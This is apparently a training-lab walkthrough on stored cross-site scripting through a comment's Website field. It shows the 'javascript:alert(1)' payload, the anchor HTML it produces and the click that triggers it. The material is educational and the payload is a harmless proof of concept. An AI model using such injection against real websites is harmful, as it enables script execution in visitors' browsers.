## 8 - Stored XSS into anchor href attribute with double quotes HTML-encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

## Notes

- Possibility to leave a comment

## Resume

1. Post a comment
2. Inject a malicious `javascript:` URL in the `Website` field
3. Trigger the XSS by clicking on the author name

## Solve

First, submit a normal comment using a random value inside the `Website` field and intercept the request using `Burp Suite`.

Then, browse to the article page again and inspect the generated HTML. Observe that the supplied value is reflected inside the anchor `href` attribute.

Next, replace the `Website` value with the following payload:

```text
javascript:alert(1)
```

Example malicious comment:

```text
Name: toto
Website: javascript:alert(1)
Comment: test
```

After posting the comment, the generated HTML becomes:

```html
<a id="author" href="javascript:alert(1)">toto</a>
```

To trigger the vulnerability:

1. Open the article page.
2. Click on the author name above the comment.

The browser executes:

```javascript
alert(1)
```

This confirms the stored XSS vulnerability through the `href` attribute.
